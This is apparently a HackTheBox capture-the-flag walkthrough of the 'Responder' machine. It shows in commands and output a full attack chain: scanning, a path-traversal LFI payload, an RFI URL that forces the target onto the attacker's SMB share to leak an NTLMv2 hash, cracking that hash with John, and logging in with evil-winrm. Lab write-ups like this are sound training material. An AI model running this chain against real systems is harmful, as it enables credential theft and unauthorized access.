## Reconnaissance

Kicking off with a simple Nmap scan...

__Nmap Scan__
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/responder]
└─$ sudo nmap -sC -sV -oN nmap.txt 10.129.79.102 
Nmap scan report for 10.129.79.102
Host is up (0.020s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 18 14:40:05 2022 -- 1 IP address (1 host up) scanned in 156.59 seconds
```

Before visiting the website, I used cURL, which showed me that the website is redirecting us to a local domain.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/responder]
└─$ curl http://10.129.79.102
<meta http-equiv="refresh" content="0;url=http://unika.htb/">
```

So, i decided to add the entry to my `/etc/hosts` file
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/responder]
└─$ grep unika.htb /etc/hosts
10.129.79.102 unika.htb
```

There is a page on the website that allows the user to change language: `http://unika.htb/index.php?page=french.html`

We can confirm `LFI` by requiring the host file on Windows: 
```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

It is also possible to `RFI`.

On a Windows machine we can require a SMB share we own to make `NetNTLMv2` challenge answers leak and capture them with Responder.

So, I turned on my responder
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/responder]
└─$ sudo responder -I tun0
```

Force the target to visit my SMB server:
```
http://unika.htb/index.php?page=//10.10.14.192/darshan
```

And I've successfully captured one:
```
[SMB] NTLMv2-SSP Client   : ::ffff:10.129.79.102
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:a14c9f9bcf28d2d6:B31A2A081245A35E2A380BDB21E00167:0101000000000000802C21C93B53D801AA24A32512B226C10000000002000800380051004B004F0001001E00570049004E002D00320038003100440053004B003500560049005300330004003400570049004E002D00320038003100440053004B00350056004900530033002E00380051004B004F002E004C004F00430041004C0003001400380051004B004F002E004C004F00430041004C0005001400380051004B004F002E004C004F00430041004C0007000800802C21C93B53D80106000400020000000800300030000000000000000100000000200000170161A6F5FB1FE597B7FEFA4AB248801DFD17D85746DE42F3D416E0C4C9ACA60A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100390032000000000000000000
```

Now, I simply used `John the ripper` to crack the hash
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/responder]
└─$ john hash.txt -w=/usr/share/wordlists/passwords/rockyou.txt --format=netntlmv2
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)
1g 0:00:00:00 DONE (2022-04-18 15:57) 1.063g/s 4357p/s 4357c/s 4357C/s slimshady..oooooo
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

With the nmap scan we saw the port `5985` was open which is the port for `WinRM`.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Tier-1/responder]
└─$ evil-winrm -u Administrator -p badminton -i unika.htb

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public

*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
[REDACTED]
```

